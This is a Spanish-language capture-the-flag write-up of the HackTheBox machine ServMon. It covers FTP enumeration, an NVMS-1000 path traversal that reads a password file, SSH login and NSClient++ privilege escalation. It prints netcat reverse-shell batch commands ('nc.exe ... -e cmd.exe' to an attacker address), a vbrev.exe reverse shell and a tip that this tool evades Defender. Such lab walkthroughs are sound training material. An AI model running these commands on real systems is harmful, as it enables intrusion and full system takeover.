---
layout: single
title: Máquina ServMon - HackTheBox (OSCP Style)
excerpt: "Resolución de la máquina ServMon, la cual figura en la plataforma con un nivel de dificultad Easy (aunque la escalada la catalogaría como Medium por la condición en la que está la máquina)."
date: 2021-09-21
classes: wide
header:
  teaser: /assets/images/servmon/portada.png
  teaser_home_page: true
categories:
  - HTB
  - Blog
tags:
  - Blog
  - Writeup
  - Guía
  - Walkthrough
---

+ **Información de la máquina**
	
	![0]
	
+ Antes de iniciar cabe mencionar que la máquina cuenta con un software bastante inestable, el cual juega un papel muy importante al momento de escalar privilegios en la etapa final del ataque. Se describirá qué hacer en ese caso y, además, cómo pasé de hacer pentesting desde Kali a tener que hacerlo desde Windows dada la condición de la máquina. No implica que me vaya a pasar a Windows ahora para hacer pentesting, pero he de decir que fue una experiencia bastante gratificante probar comprometer una máquina desde otro SO que no sea Unix.

+ Iniciamos la fase de reconocimiento con un escaneo rápido con ayuda de nmap en busca de puertos TCP abiertos.

	![1]
	
	Vemos una cantidad considerable de puertos habilitados. Destacan un servidor FTP (21), un SSH (22), un HTTP (80), un SMB (139 y 445) y un HTTPS (8443).
	
+ La fase de reconocimiento consistirá en analizar cada uno de estos servicios uno por uno, en orden ascendente. Dicho eso, el primer servicio que excaneamos es el FTP. Intentamos conectarnos con una sesión de invitado (anonymous).

	![2]
	
	Vemos que podemos acceder e incluso listar los contenidos del servidor. Destaca una carpeta **Users**.
	
	Dentro de dicha carpeta veremos dos directorios de usuarios del sistema: **Nadine** y **Nathan**.
	
	![3]
	
	Estos directorios a su vez contienen un archivo cada uno. Los transferimos a nuestra máquina con la instrucción **get**.
	
	![4]
	
	Antes de dejar el servicio FTP, verificamos si tenemos capacidad de escritura dentro de este. Intentamos subir un archivo al sistema, pero este no nos lo permitió. Se deduce que solo tenemos permisos de lectura.
	
	![5]
	
+ Analizando los archivos que encontramos en el FTP, descubrimos que en el **Confidential.txt** hay información de relevancia:

	![6]
	
	Nos indican que el usuario **Nathan** tiene almacenado un archivo con contraseñas en el **Escritorio** bajo el nombre de **Passwords.txt**.
	
	El segundo archivo llamado **Notes to do.txt** nos brinda información acerca de un servicio llamado **NVMS** corriendo en el sistema, y que recientemente fueron actualizadas sus contraseñas.
	
	![7]

+ Seguimos enumerando el sistema. Como el servicio SMB se encuentra habilitado, intentamos conectarnos por medio de una **null** session para listar los recursos compartidos a nivel de red.

	``smbmap -H 10.10.10.184``

	![8]
	
	Por desgracia, no somos capaces de enumerar nada sin credenciales válidas. Intentamos con la herramienta **crackmapexec** para ver si encontramos más información acerca del sistema:
	
	![9]
	
	Dicha herramienta solo nos indica que estamos ante un Windows 10 con arquitectura de 64 bits, pero nada relevante por ahora.
	
+ El siguiente servicio a analizar es el HTTP. Con **whatweb** realizamos un escaneo previo del servicio en busca de cabeceras o servicios CMS que corran en el mismo.

	![10]
	
	Este escaneo no nos devuelve información que sea de relevancia. Por lo tanto, el siguiente paso será acceder al servidor por medio de un navegador.
	
	![11]
	
	En la página que se despliega podemos ver un servicio **NVMS** corriendo. Recordemos que en las notas encontradas en el servicio **SMB** se mencionaba este software. Como no contamos con credenciales que probar, y según parece, no cuenta con credenciales por defecto, buscamos el servicio en **searchsploit** para ver si es vulnerable.
	
	![12]
	
	Encontramos no solo el servicio **NVMS**, sino además que la versión que corre en el servidor es vulnerable (1000) a un **Directory Traversal**, en lo que parece ser un LFI en toda regla. Recordemos que un **LFI** es una vulnerabilidad que nos permite visualizar archivos que estén almacenados en el servidor donde corre el servicio HTTP por medio de peticiones a este. El método por el cual realiza este acceso a los archivos, en la mayoría de los casos, se da por un **Directory Path Traversal**, que es el método mediante el cual podemos movernos hasta la raíz del sistema de ficheros y de ahí acceder a cualquier recurso de la máquina. Se caracteriza por la instrucción en bash para moverse entre directorios: ../../../, la cual se repite la cantidad de veces que sea necesario para lograr llegar a la raíz del sistema de archivos.
	
	Si examinamos el exploit, veremos que solo consiste en realizar una petición HTTP que intente hacer un GET a un archivo del sistema, en este caso, intenta acceder a el archivo localizado en **C:\Windows\win.ini**. Esta petición tendrá como respuesta el contenido del archivo solicitado.
	
	![13]
	
	Con ayuda de **BurpSuite**, realizamos esta petición **GET** al archivo mencionado, con la intención de solo probar si la aplicación es vulnerable a dicho exploit.
	
	![14]
	
	Vemos que en la respuesta podemos ver el contenido del archivo, por lo que se confirma el vector de ataque. El siguiente paso es ver de qué manera podemos emplear esta vulnerabilidad.
	
	Si recordamos, en el archivo **Confidential.txt** encontrado en el servicio SMB, vimos que en el Escritorio del usuario **Nadine** se encontraba un archivo con contraseñas. Supongamos que la estructura de archivos sería la siguiente:
	
	``C:\Users\Nadine\Desktop\Passwords.txt``
	
	Con esto en mente, nos aprovechamos del **LFI** para tratar de ver el contenido de este archivo:
	
	![15]
	
	En la respuesta somos capaces de ver un listado de contraseñas, por lo que nuestra deducción de la ubicación de dicho archivo fue acertada. La cuestión ahora es ¿dónde probamos esas contraseñas?
	
+ Como hacemos cada que encontramos un diccionario de contraseñas, probamos mediante fuerza bruta a quién pertenecen y, sobre todo, si son válidas. Podemos hacerlo por medio de **crackmapexec**, solo que primero necesitaríamos un listado de usuarios potenciales para probar las credenciales.

	Creamos un pequeño diccionario con los únicos dos usuarios que conocemos hasta el momento: **nadine** y **nathan**.

	![16]
	
	Ya con todo listo, corremos **crackmapexec** con el listado de usuarios y el de contraseñas, esperando que alguna combinación resulte en credenciales válidas.
	
	![17]
	
	Como podemos observar, hubo un match entre el usuario **nadine** y la contraseña **L1k3B1gBut7s@W0rk**
	
	¿Dónde podemos probar estas credenciales válidas? El servicio web ya no nos es útil, dado que su única vulnerabilidad consistía en un **LFI**, el cual no necesitaba autenticación para funcionar. Pero hay un puerto que usualmente no vemos en Windows, pero es el candidato perfecto para conectarnos a la máquina con las credenciales obtenidas: **SSH**.

+ Para conectarnos a Windows por medio de **SSH**, ejecutamos el mismo comando que solemos correr para sistemas Linux.

	``ssh nadine@10.10.10.184``
	
	![18]
	
	Ya dentro del sistema, podemos visualizar la flag de usuario.
	
	![19]
	
+ Nuestro último paso es escalar privilegios dentro del sistema. Para ello, comenzamos a enumerar el sistema en busca de potenciales vectores de ataque. Con ``whoami /all`` listamos los privilegios con los que contamos en el sistema y los grupos a los que pertenece nuestro usuario.

	![20]
	
	No vemos nada relevante que nos ayude a escalar privilegios. Antes de ejecutar un **winPEAS** en el sistema, seguimos enumerando con los servicios que aún no hemos terminado de analizar de manera externa.
	
	Primero, intentamos listar los recursos compartidos a nivel de red con los que cuenta el servicio **SMB** proporcionando las credenciales que obtuvimos con anterioridad.
	
	![21]
	
	Solo podemos acceder al recurso **IPC$**, por desgracia, este no contiene nada de información relevante para nosotros.
	
	Hay un puerto más que no hemos analizado aún, el puerto **8443**, el cual corre un servidor web HTTPS.
	
	![22]
	
	Si accedemos a este recurso desde un navegador, veremos que este no termina de renderizar correctamente.
	
	![23]
	
	Sin embargo, no es un problema de recursos inaccesibles por un **virtual hosting**, sino que el recurso solo puede ser accesible desde la red interna (localhost). Para poder hacerle creer al sistema que la petición al sitio web viene desde la red interna y no de manera externa, necesitamos hacer un **port forwarding** del puerto 8443. Podemos hacerlo por **chisel**, pero como contamos con credenciales válidas de SSH, podemos hacerlo directamente desde esta herramienta.
	
	``ssh nadine@10.10.10.184 -L 8443:127.0.0.1:8443``
	
	![24]
	
	De esta manera, el puerto 8443 de la máquina remota pasa a ser el puerto 8443 de nuestra máquina, y podemos acceder a nuestro **localhost** para visualizar el contenido.
	
	![25]
	
	Vemos que la página web despliega un servicio llamado **NSClient++**. Si buscamos este servicio en **searchsploit**, veremos que es vulnerable a una serie de pasos que nos permitirían escalar privilegios en el sistema donde se ejecute.
	
	![26]
	
	El exploit contempla los siguientes pasos:
	
	```
	1. Grab web administrator password
	- open c:\program files\nsclient++\nsclient.ini
	or
	- run the following that is instructed when you select forget password
		C:\Program Files\NSClient++>nscp web -- password --display
		Current password: SoSecret

	2. Login and enable following modules including enable at startup and save configuration
	- CheckExternalScripts
	- Scheduler

	3. Download nc.exe and evil.bat to c:\temp from attacking machine
		@echo off
		c:\temp\nc.exe 192.168.0.163 443 -e cmd.exe

	4. Setup listener on attacking machine
		nc -nlvvp 443

	5. Add script foobar to call evil.bat and save settings
	- Settings > External Scripts > Scripts
	- Add New
		- foobar
			command = c:\temp\evil.bat

	6. Add schedulede to call script every 1 minute and save settings
	- Settings > Scheduler > Schedules
	- Add new
		- foobar
			interval = 1m
			command = foobar

	7. Restart the computer and wait for the reverse shell on attacking machine
		nc -nlvvp 443
		listening on [any] 443 ...
		connect to [192.168.0.163] from (UNKNOWN) [192.168.0.117] 49671
		Microsoft Windows [Version 10.0.17134.753]
		(c) 2018 Microsoft Corporation. All rights reserved.

		C:\Program Files\NSClient++>whoami
		whoami
		nt authority\system
	```
	
+ El primer paso es obtener la contraseña de administrador del sitio web (y que ya vimos que la página nos solicita), esto puede hacerse si nos vamos al directorio donde este se encuentra instalado y ejecutamos lo siguiente:

	```
		Ruta: C:\Program Files\NSClient++
		Comando: nscp web -- password --display
	```

	![27]
	
	Esto nos devuelve la contraseña a ingresar en el sitio web. Una vez ingresada, podremos ver el panel de administración de este software.
	
	![28]
	
	El segundo paso nos indica que debemos revisar que los módulos **CheckExternalScripts** y **Scheduler** estén habilitados.

	![29]
	
	Una vez corroborado este dato, debemos crear un archivo **bat** malicioso que ejecutará una simple sentencia que consiste en entablar una reverse shell con ayuda de **netcat**. Su contenido es el siguiente:
	
	```
		@echo off
		c:\temp\nc.exe 10.10.14.22 443 -e cmd.exe
	```
	
	Este archivo **bat** debe ser enviado a la máquina víctima, junto con el ejecutable de **netcat** a la ruta **C:\Temp**
	
	![30]
	
	![31]
	
	El siguiente paso consiste en crear un nuevo script externo que cumpla con la función de ejecutar el **bat** malicioso que hemos puesto en la máquina. Para ello, debemos ir a la sección de Settings->Settings->External Scripts->Scripts y añadir uno nuevo con la siguiente información:
	
	```
		key: Reverse (el nombre es identificativo y no es relevante)
		value: c:\temp\evil.bat
	```
	
	Hacemos clic en **Add**.
	
	![32]
	
	Cuando esté añadido, debemos guardar los cambios haciendo clic en **Changes** y después en **Save configuration**.
	
	![33]
	
	Finalizamos esta configuración haciendo clic en **Control** y después en **Reload**. Para este momento, debemos tener el netcat en escucha.
	
	![34]
	
	Nota: Si la página web se queda en **Reloading...** por mucho tiempo, debemos reiniciar la máquina e intentarlo de nuevo. A esto me refería cuando decía que el software es demasiado inestable, y esto no funciona a la primera. El objetivo consiste en dirigirse, una vez termine el **"Reload"** de la página, a la sección de **Queries** y desde ahí ejecutar el script que acabamos de crear.
	
	Para este momento, se intentó este procedimiento una cantidad de 5 veces, y por desgracia, ninguna funcionó. La página se quedaba colgada, no terminaba de cargar el script, e incluso, el netcat era borrado de la máquina víctima. En un punto se logró ejecutar el script, pero este no finalizó de manera exitosa ya que la máquina detectó el **netcat** como malicioso y lo borraba cada vez que lo volvíamos a subir.

+ Llegado a este punto pensé en rendirme, sin embargo, luego de investigar sobre el tema me encontré con que es posible llevar a cabo este ataque desde una máquina Windows con ayuda del software **VbRev**. Este es una especie de netcat que el Defender no detecta como malicioso, y lo mejor de todo es que cuenta con una interfaz gráfica que nos permite ejecutar comandos, listar archivos, subir archivos, descargarlos, listar procesos, entre muchas utilidades más. No perdía nada con intentarlo, y a cambio, aprendería a realizar pentesting desde una máquina Windows.

	La interfaz es bastante sencilla, primero requiere de un puerto en el que se pondrá a la escucha por conexiones entrantes (sí, igual que netcat), damos clic en **Start Listener**
	
	![35]
	
	![36]
	
	Como realizaremos el procedimiento desde Windows, ya conectados a la VPN de **Hack the Box**, abrimos el cmd para conectarnos por **SSH**. Dentro del sistema, debemos copiar dos archivos que necesita VbRev para entablar la reverse shell:
	
	```
		vbrev.exe
		vbrev.shared.dll
	```
	
	Ya con estos archivos en el sistema víctima, podemos ejecutarlo para entablar la reverse shell:
	
	``vbrev.exe 10.10.14.22 4444``
	
	![37]
	
	Del lado del VbRev veremos que recibimos la conexión.
	
	![38]
	
	Para hacer el **port forwarding**, podemos hacer uso de **SSH**, sin embargo, el mismo VbRev tiene un ejecutable llamado **PT.exe** que nos realiza esta tarea; es una especie de **chisel**. Para ejecutarla, en nuestra máquina donde recibiremos el puerto ejecutamos lo siguiente:
	
	``PT.exe -p 8443``
	
	![39]
	
	Del lado de la máquina víctima (en el VbRev) ejecutamos en el apartado de **Command Prompt** lo siguiente:
	
	``PT.exe -s 10.10.14.22 -p 8443``
	
	Con esto, ya tendremos el port forwarding necesario para acceder el NSClient++. Accedemos desde **Chrome** esta vez (no pude probarlo con Firefoz, así que no descarto la idea de que quizá los errores previos se dieran por no usar el navegador adecuado).
	
	![40]
	
	Dentro de la página web, accedemos al apartado de **Queries** para intentar ejecutar el script creado. Vemos que este aún existe, sin embargo, debemos modificarlo para que ahora no tire por **netcat**, sino por **VbRev**.
	
	![41]
	
	Abrimos otra instancia del VbRevGUI, ahora en escucha por otro puerto que es por donde recibiremos la shell como el usuario administrador. Desde el sitio web, hacemos clic en el botón **Run**.
	
	![42]
	
	Ya ejecutado, veremos cómo recibimos una conexión desde la máquina correctamente. De hecho, en la misma cabecera podemos ver el usuario con el que recibimos la conexión: **NT AUTHORITY\SYSTEM**.
	
	![43]
	
	El mismo comando **whoami** lo corrobora.
	
	![44]
	
	Dado que este programa cuenta con un explorador de archivos, solo debemos ir a la carpeta del usuario administrador para obtener la flag de root.
	
	![45]
	
	![46]
	
	Con esto, hemos finalizado de comprometer la máquina y aprendido a hacer esta etapa del pentesting desde un sistema Windows. Sin duda, algo que nos servirá a futuro.
	
[0]:/assets/images/servmon/0.png
[1]:/assets/images/servmon/1.png
[2]:/assets/images/servmon/2.png
[3]:/assets/images/servmon/3.png
[4]:/assets/images/servmon/4.png
[5]:/assets/images/servmon/5.png
[6]:/assets/images/servmon/6.png
[7]:/assets/images/servmon/7.png
[8]:/assets/images/servmon/8.png
[9]:/assets/images/servmon/9.png
[10]:/assets/images/servmon/10.png
[11]:/assets/images/servmon/11.png
[12]:/assets/images/servmon/12.png
[13]:/assets/images/servmon/13.png
[14]:/assets/images/servmon/14.png
[15]:/assets/images/servmon/15.png
[16]:/assets/images/servmon/16.png
[17]:/assets/images/servmon/17.png
[18]:/assets/images/servmon/18.png
[19]:/assets/images/servmon/19.png
[20]:/assets/images/servmon/20.png
[21]:/assets/images/servmon/21.png
[22]:/assets/images/servmon/22.png
[23]:/assets/images/servmon/23.png
[24]:/assets/images/servmon/24.png
[25]:/assets/images/servmon/25.png
[26]:/assets/images/servmon/26.png
[27]:/assets/images/servmon/27.png
[28]:/assets/images/servmon/28.png
[29]:/assets/images/servmon/29.png
[30]:/assets/images/servmon/30.png
[31]:/assets/images/servmon/31.png
[32]:/assets/images/servmon/32.png
[33]:/assets/images/servmon/33.png
[34]:/assets/images/servmon/34.png
[35]:/assets/images/servmon/35.png
[36]:/assets/images/servmon/36.png
[37]:/assets/images/servmon/37.png
[38]:/assets/images/servmon/38.png
[39]:/assets/images/servmon/39.png
[40]:/assets/images/servmon/40.png
[41]:/assets/images/servmon/41.png
[42]:/assets/images/servmon/42.png
[43]:/assets/images/servmon/43.png
[44]:/assets/images/servmon/44.png
[45]:/assets/images/servmon/45.png